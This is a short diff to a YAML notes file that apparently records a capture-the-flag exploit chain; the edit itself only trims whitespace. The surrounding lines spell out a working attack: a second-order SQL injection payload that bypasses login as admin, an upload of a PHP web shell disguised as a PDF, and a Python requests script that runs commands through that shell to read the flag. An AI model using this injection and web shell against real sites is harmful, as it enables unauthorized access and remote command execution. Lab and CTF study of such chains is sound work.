@@ -19,8 +19,8 @@ tricks:
     when: "Exploit SQLi"
     how: "UNION inject to return username containing SQL injection for second query"
     payload: |
-      ' UNION SELECT CONCAT('admin',CHAR(39),' OR ',CHAR(39),'1',CHAR(39),'=',CHAR(39),'1',CHAR(39),' -- ')-- 
-      # Returns: admin' OR '1'='1' -- 
+      ' UNION SELECT CONCAT('admin',CHAR(39),' OR ',CHAR(39),'1',CHAR(39),'=',CHAR(39),'1',CHAR(39),' -- ')--
+      # Returns: admin' OR '1'='1' --
       # Second query becomes: WHERE username = 'admin' OR '1'='1' --
 
   - name: "Step 3: Bypass file upload check"
@@ -36,10 +36,10 @@ tricks:
       # SQLi bypass login
       payload = "' UNION SELECT CONCAT('admin',CHAR(39),' OR '...)-- "
       s.post(f"{TARGET}/index.php", data={"username": payload, "password": "x"})
-      
+
       # Upload webshell
       files = {"invoice": ("shell.pdf.php", b"<?php system($_GET['cmd']); ?>", "application/pdf")}
       s.post(f"{TARGET}/upload.php", files=files)
-      
+
       # Execute command
       resp = s.get(f"{TARGET}/uploaded_invoices/shell.pdf.php", params={"cmd": "cat /FLAG.txt"})
